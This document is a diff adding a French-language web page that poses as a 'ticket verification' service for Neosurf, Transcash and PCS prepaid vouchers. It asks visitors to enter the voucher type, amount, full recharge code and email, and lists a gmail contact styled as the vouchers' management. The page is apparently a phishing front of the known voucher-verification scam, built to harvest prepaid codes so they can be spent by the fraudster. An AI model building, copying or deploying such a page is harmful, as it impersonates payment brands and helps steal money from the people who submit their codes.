@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification de Recharge</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="navbar">
+        <a href="index.html">Accueil</a>
+        <a href="verification.html">Vérification</a>
+        <a href="#contact">Contact Clientèle</a>
+    </div>
+
+    <div class="container">
+        <h1>Vérification du Ticket</h1>
+        <form id="verificationForm">
+            <label for="name">Nom de la recharge*</label>
+            <select id="name" name="name" required>
+                <option value="neosurf">Neosurf</option>
+                <option value="transcash">Transcash</option>
+                <option value="pcs">PCS</option>
+            </select>
+
+            <label for="amount">Montant*</label>
+            <input type="text" id="amount" name="amount" required>
+
+            <label for="code">Code de la recharge*</label>
+            <input type="text" id="code" name="code" required>
+
+            <label>
+                <input type="checkbox" id="hideCode" name="hideCode">
+                Cacher votre code:
+            </label>
+            <label>
+                <input type="radio" id="hideCodeYes" name="hideCodeOption" value="oui" required>
+                Oui
+            </label>
+            <label>
+                <input type="radio" id="hideCodeNo" name="hideCodeOption" value="non" required>
+                Non
+            </label>
+
+            <label for="email">Email*</label>
+            <input type="email" id="email" name="email" required>
+
+            <input type="submit" value="Vérifiez">
+        </form>
+
+        <p>Notre Politique de confidentialité</p>
+
+        <h2>Horaires d'Ouverture</h2>
+        <p>Lu-Ve 07j/24H<br>Sa-Di 8h/13H</p>
+
+        <h2>NOUS TROUVER</h2>
+        <p>123 Rue du test<br>Paris, 75001</p>
+
+        <h2>Contact</h2>
+        <p>Email : <a href="mailto:ladirectiontranscashpcs@gmail.com">ladirectiontranscashpcs@gmail.com</a></p>
+
+        <div class="footer">
+            <p><a href="#">Mentions légales</a> | <a href="#">Politique de confidentialité</a> | <a href="#">Politique des cookies</a> | <a href="#">Plan du site</a></p>
+            <p>Connexion Jimdo | Ce site a été conçu avec Jimdo. Inscrivez-vous gratuitement sur <a href="https://fr.jimdo.com">https://fr.jimdo.com</a></p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+  </html>
